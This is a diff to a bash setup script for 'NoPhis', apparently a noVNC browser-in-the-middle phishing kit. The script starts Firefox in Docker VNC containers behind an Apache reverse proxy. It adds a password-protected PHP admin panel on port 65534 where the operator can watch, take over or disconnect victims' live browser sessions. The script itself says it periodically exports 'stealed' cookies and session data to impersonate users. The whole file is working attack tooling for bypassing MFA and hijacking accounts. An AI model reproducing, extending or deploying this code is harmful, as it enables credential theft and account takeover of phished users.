@@ -98,7 +98,12 @@ case "$1" in
 	icopath="./novnc.ico"
 	
 	printf "[-] Configuration file generating\033[0K\r" 
-	echo "NameVirtualHost *" > ./proxy/000-default.conf
+	echo 'NameVirtualHost *
+             Header unset ETag
+             Header set Cache-Control "max-age=0, no-cache, no-store, must-revalidate"
+             Header set Pragma "no-cache"
+             Header set Expires "Wed, 12 Jan 1980 05:00:00 GMT"
+	     ' > ./proxy/000-default.conf
 	
 	if [ -n "$SSL" ]
 	then
@@ -108,80 +113,203 @@ case "$1" in
 	   	SSLCertificateFile /etc/ssl/certs/server.crt
 	   	SSLCertificateKeyFile /etc/ssl/private/server.key
 		" >> ./proxy/000-default.conf
+		echo '
+		RewriteEngine On
+    		RewriteMap redirects txt:/tmp/redirects.txt
+    		RewriteCond ${redirects:%{HTTP_HOST}%{REQUEST_URI}} ^.+
+    		RewriteRule ^ ${C:1}? [R=302,L]
+		' >> ./proxy/000-default.conf
 	else
 		echo "<VirtualHost *:80>" >> ./proxy/000-default.conf
+		echo '
+		RewriteEngine On
+    		RewriteMap redirects txt:/tmp/redirects.txt
+    		RewriteCond ${redirects:%{HTTP_HOST}%{REQUEST_URI}} ^.+
+    		RewriteRule ^ ${C:1}? [R=302,L]
+		
+		<Location /status.php>
+		    Deny from all
+		</Location>
+		' >> ./proxy/000-default.conf
 	fi
 	 
         printf "[+] Configuration file generated \n" 
         
-        htmlpath="./output/status.html"
+        htmlpath="./output/status.php"
         if [ -e $htmlpath ]
         then
         	rm -rf $htmlpath
         fi
         
         echo '
-	<!DOCTYPE html>
-	<html>
-	<head>
-	  <title>NoPhis status</title>
-	  <style>
-	    body {
-	      background-color: rgb(9, 25, 75); /* Set the background to black */
-	      margin: 0; /* Reset default body margin */
-	      padding: 0; /* Reset default body padding */
-	    }
+<!DOCTYPE html>
+<html>
+<head>
+<title>NoPhis status</title>
+<style>
+body {
+    background-color: rgb(9, 25, 75);
+    margin: 0;
+    padding: 0;
+}
 
-	    #container {
-	      background-color: rgb(56, 74, 99);
-	      width: 150vh; /* Set equal width and height */
-	      height: 60vh;
-	      border-radius: 10px; /* Add rounded corners */
-	      overflow: hidden; /* Hide the scrollbars */
-	      display: flex; /* Use flexbox */
-	      align-items: center; /* Vertically center the content */
-	      justify-content: center; /* Horizontally center the content */
-	      margin: 20px auto; /* Center the container */
-	      position: relative; /* Create a context for absolute positioning */
-	    }
+.container {
+    background-color: rgb(56, 74, 99);
+    width: 180vh;
+    height: 80vh;
+    border-radius: 10px;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 20px auto;
+    position: relative;
+}
 
-	    #scaled-iframe {
-	      margin-right: 300px;
-	      min-width: 1600px;
-	      min-height: 900px;
-            -ms-zoom: 0.5;
-            -moz-transform: scale(0.5);
-            -moz-transform-origin: middle;
-            -o-transform: scale(0.5);
-            -o-transform-origin: middle;
-            -webkit-transform: scale(0.5);
-            -webkit-transform-origin: middle;
-	    }
+#scaled-iframe {
+    min-width: 1600px;
+    min-height: 900px;
+    -ms-zoom: 0.5;
+    -moz-transform: scale(0.5);
+    -moz-transform-origin: middle;
+    -o-transform: scale(0.5);
+    -o-transform-origin: middle;
+    -webkit-transform: scale(0.5);
+    -webkit-transform-origin: middle;
+}
 
-	    #button {
-	      background-color: orange;
-	      position: absolute;
-	      color: white;
-	      border: none;
-	      border-radius: 5px;
-	      padding: 10px 40px;
-	      font-size: 16px;
-	      cursor: pointer;
-	      margin-left: 1100px; /* Adjust the margin-left as per your preference */
-	      text-decoration: none; /* Remove underline */
-	      white-space: nowrap;
-	    }
-	  </style>
-	</head>
-	<body>
-	' > ./output/status.html
+.buttons-container {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start; /* Align buttons to the left within the container */
+    justify-content: space-between; /* Add equal space between buttons */
+    background-color: rgb(56, 74, 99);
+    border-radius: 10px;
+    padding: 10px;
+    margin-right: 400px; /* Add spacing between bigger container and buttons container */
+}
+
+.orange-button {
+    background-color: orange;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    padding: 10px 30px;
+    font-size: 16px;
+    cursor: pointer;
+    text-decoration: none;
+    white-space: nowrap;
+    margin-bottom: 10px; /* Add bottom margin for spacing between buttons */
+}
+</style>
+</head>
+
+  <?php
+    if (isset($_POST["create_file"])) {
+        // Get the value of the file content from the form input
+        $file_content = $_POST["file_content"];
+        $file_content2 = $_POST["file_content2"];
+	$ip = $_POST["ip_value"];
+        // Specify the file path and name
+        $file_path = "/tmp/redirects.txt";
+        $ip_path = "/tmp/disconnect.txt";
+
+        if (file_exists($ip_path)) {
+            // Read the existing content of the file
+            $ipfile_content = file_get_contents($ip_path);
+
+            // Check if the new content is already in the file
+            if (strpos($ipfile_content, $ip) !== false) {
+                // echo "<p>Error: Duplicate content. The content already exists in the file.</p>";
+            } else {
+                // If the new content is not a duplicate, open the file in append mode to add content at the end
+                $ipfile_handle = fopen($ip_path, "a") or die("Unable to open file for appending!");
+
+                // Write the content to the file
+                fwrite($ipfile_handle, $ip . PHP_EOL);
+
+                // Close the file handle
+                fclose($ipfile_handle);
+
+                // echo "<p>File operation completed successfully!</p>";
+            }
+        } else {
+            // If the file does not exist, create a new file
+            $ipfile_handle = fopen($ip_path, "w") or die("Unable to create file!");
+	    
+            // Write the content to the file
+            fwrite($ipfile_handle, $ip . PHP_EOL);
+
+            // Close the file handle
+            fclose($ipfile_handle);
+
+            // echo "<p>File created successfully!</p>";
+        }
+
+
+
+
+        // Check if the file exists
+        if (file_exists($file_path)) {
+            // Read the existing content of the file
+            $existing_content = file_get_contents($file_path);
+
+            // Check if the new content is already in the file
+            if (strpos($existing_content, $file_content) !== false) {
+                // echo "<p>Error: Duplicate content. The content already exists in the file.</p>";
+            } else {
+                // If the new content is not a duplicate, open the file in append mode to add content at the end
+                $file_handle = fopen($file_path, "a") or die("Unable to open file for appending!");
+
+                // Write the content to the file
+                fwrite($file_handle, $file_content . PHP_EOL);
+
+                // Close the file handle
+                fclose($file_handle);
+
+                // echo "<p>File operation completed successfully!</p>";
+            }
+            
+            // Check if the new content is already in the file
+            if (strpos($existing_content, $file_content2) !== false) {
+                // echo "<p>Error: Duplicate content. The content already exists in the file.</p>";
+            } else {
+                // If the new content is not a duplicate, open the file in append mode to add content at the end
+                $file_handle = fopen($file_path, "a") or die("Unable to open file for appending!");
+
+                // Write the content to the file
+                fwrite($file_handle, $file_content2 . PHP_EOL);
+
+                // Close the file handle
+                fclose($file_handle);
+
+                // echo "<p>File operation completed successfully!</p>";
+            }
+        } else {
+            // If the file does not exist, create a new file
+            $file_handle = fopen($file_path, "w") or die("Unable to create file!");
+	    
+            // Write the content to the file
+            fwrite($file_handle, $file_content . PHP_EOL);
+	    fwrite($file_handle, $file_content2 . PHP_EOL);
+            // Close the file handle
+            fclose($file_handle);
+
+            // echo "<p>File created successfully!</p>";
+        }
+    }
+    ?>
+
+ 
+	' > ./output/status.php
         
 	declare -a urls=()
 	printf "[-] Starting containers \033[0K\r\n"  
 	for (( c=$START; c<=$END; c++ ))
 	do
 	    PW=$(openssl rand -hex 14)
-	    sudo docker run -dit -p690$c:6901 --name vnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 vnc-docker &> /dev/null
+	    AdminPW=$(tr -dc 'A-Za-z0-9!' < /dev/urandom | head -c 32)
+	    sudo docker run -dit --name vnc-user$c -e VNC_PW=$PW -e NOVNC_HEARTBEAT=30 vnc-docker &> /dev/null
 	    sleep 1
 	    sudo docker exec vnc-user$c sh -c "firefox &" &> /dev/null
 	    sleep 1
@@ -210,7 +338,7 @@ case "$1" in
 	    if [ -e $icopath ]
 	    then
 	    	sudo docker cp ./novnc.ico vnc-user$c:/usr/libexec/noVNCdim/app/images/icons/novnc.ico
-	    	rm -r ./novnc.ico
+	    	
 	    fi
 	    
 	    
@@ -221,6 +349,7 @@ case "$1" in
 	    
 	    CIP=$(sudo sudo docker container inspect vnc-user$c | grep -m 1 -oP '"IPAddress":\s*"\K[^"]+')
 	    
+
 	    echo "
 		<Location /$PW>
 		ProxyPass http://$CIP:6901
@@ -239,35 +368,63 @@ case "$1" in
 	if [ -n "$SSL" ]
 	then
 		echo "
-		  <div id='container'>
-    		    <iframe id='scaled-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
-    		    <a href='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' id='button'>View Session</a>
-  		  </div>
-		" >> ./output/status.html
+                  <div class='container'>
+			<iframe id='scaled-iframe' src='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
+			<form action='' method='post'>
+			<div class='buttons-container'>
+			    <a href='https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' class='orange-button'>View user Session  $c</a>
+                            <input type='hidden' name='file_content' value='$Domain/$PW/websockify $Domain'>
+                            <input type='hidden' name='file_content2' value='$Domain/$PW/conn.html $Domain'>
+                            <input type='hidden' name='ip_value' value='$CIP'>
+			    <button type='submit' name='create_file' class='orange-button'>Disconnect User Session</button>
+			    <a href='https://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' class='orange-button'>Connect to Session $c</a>
+			</div>
+			</form>
+		    </div>
+		" >> ./output/status.php
 		urls+=("https://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote")
 	else
 		echo "
-		  <div id='container'>
-    		    <iframe id='scaled-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
-    		    <a href='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' id='button'>View Session $c</a>
-  		  </div>
-		" >> ./output/status.html
+                  <div class='container'>
+			<iframe id='scaled-iframe' src='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true'></iframe>
+			<form action='' method='post'>
+			<div class='buttons-container'>
+			    <a href='http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote&view_only=true' class='orange-button'>View user Session  $c</a>
+                            <input type='hidden' name='file_content' value='$Domain/$PW/websockify $Domain'>
+                            <input type='hidden' name='file_content2' value='$Domain/$PW/conn.html $Domain'>
+                            <input type='hidden' name='ip_value' value='$CIP'>
+			    <button type='submit' name='create_file' class='orange-button'>Disconnect User Session</button>
+			    <a href='http://$Domain:65534/angler/$PW/conn.html?path=/angler/$PW/websockify&password=$PW&autoconnect=true&resize=remote' class='orange-button'>Connect to Session $c</a>
+			</div>
+			</form>
+		    </div>
+		" >> ./output/status.php
 		urls+=("http://$Domain/$PW/conn.html?path=/$PW/websockify&password=$PW&autoconnect=true&resize=remote")
 	fi
 	done
 	echo "
 	</body>
 	</html>
-        " >> ./output/status.html
+        " >> ./output/status.php
 	echo "</VirtualHost>" >> ./proxy/000-default.conf
+        rm -r ./novnc.ico
+        
+        apachefile="./proxy/000-default.conf"
+        awk '/<VirtualHost/,/<\/VirtualHost/ {gsub("*:80", "*:65534");gsub("Location /","Location /angler/");print; if (/<\/VirtualHost/) print ""}' "$apachefile" > temp.txt
+	awk '/<VirtualHost/,/<\/VirtualHost/ {gsub("Location /angler/status.php","Location /");gsub("Deny from all","AuthType Basic \n                    AuthName \"Restricted Area\" \n                    AuthUserFile /etc/apache2/.htpasswd \n                    Require valid-user");print; if (/<\/VirtualHost/) print ""}' "temp.txt" > temp2.txt
+	cat temp2.txt >> ./proxy/000-default.conf
+	
+	rm -r ./temp.txt
+	rm -r ./temp2.txt
+
         printf "[+] VNC Containers started                          \n"  
         printf "[-] Starting reverse proxy \033[0K\r\n"  
 	# start of rev proxy
 	if [ -n "$SSL" ]
 	then
-		sudo docker run -dit -p443:443 --name rev-proxy rev-proxy /bin/bash     &> /dev/null
+		sudo docker run -dit -p443:443 -p65534:65534 --name rev-proxy rev-proxy /bin/bash     &> /dev/null
 	else
-		sudo docker run -dit -p80:80 --name rev-proxy rev-proxy /bin/bash       &> /dev/null
+		sudo docker run -dit -p80:80 -p65534:65534 --name rev-proxy rev-proxy /bin/bash       &> /dev/null
 	fi
 	
 	sleep 5
@@ -277,14 +434,22 @@ case "$1" in
 		sudo docker cp $cert rev-proxy:/etc/ssl/certs/server.crt 
 		sudo docker cp $key rev-proxy:/etc/ssl/private/server.key
 	fi
-	  
+	
+	sudo docker exec rev-proxy /bin/bash -c 'echo "Listen 65534" >> /etc/apache2/ports.conf' 
+	sudo docker exec -it rev-proxy /bin/bash -c "htpasswd -cb /etc/apache2/.htpasswd angler $AdminPW"
 	sudo docker cp ./proxy/000-default.conf rev-proxy:/etc/apache2/sites-enabled/   &> /dev/null
+	sudo docker exec rev-proxy sed -i 's/MaxKeepAliveRequests 100/MaxKeepAliveRequests 0/' '/etc/apache2/apache2.conf'
+	
 	sudo docker exec rev-proxy /bin/bash service apache2 restart &> /dev/null
-        
-        
-        
+        sudo docker exec rev-proxy /bin/bash -c "cron"
+        sleep 3
+        sudo docker exec rev-proxy /bin/bash -c "crontab"
+        sudo docker cp ./output/status.php rev-proxy:/var/www/html/
         printf "[+] Reverse proxy running \033[0K\r\n"  
-          
+        printf "[+] Admin interface available under http://$Domain:65534/status.php            \n"
+        printf "    Login with: \n"
+        printf "    Username: angler \n"
+        printf "    Password: $AdminPW  \n"  
 	printf "[+] Setup completed \n"
 	printf "[+] Use the following URLs:\n"   
 	for value in "${urls[@]}"
@@ -300,7 +465,7 @@ case "$1" in
         fi
 	
 	printf "[-] Starting Loop to collect sessions and cookies from containers\n" 
-	printf "[+] You can check and view the open session by use of the status.html in the output directory\n" 
+	printf "[+] You can check and view the open session by use of the status.php in the output directory\n" 
 	#Start a loop which copies the cookies from the containers
 	printf "    Every 60 Seconds Cookies and Sessions are exported - Press [CTRL+C] to stop..\n"
 	trap 'printf "\n[-] Import stealed session and cookie JSON or the firefox profile to impersonate user\n"; printf "[-] VNC and Rev-Proxy container will be removed\n" ; sleep 2 ; sudo docker rm -f $(sudo docker ps --filter=name="vnc-*" -q) &> /dev/null && sudo docker rm -f $(sudo docker ps --filter=name="rev-proxy" -q) &> /dev/null & printf "[+] Done!"; sleep 2' SIGTERM EXIT
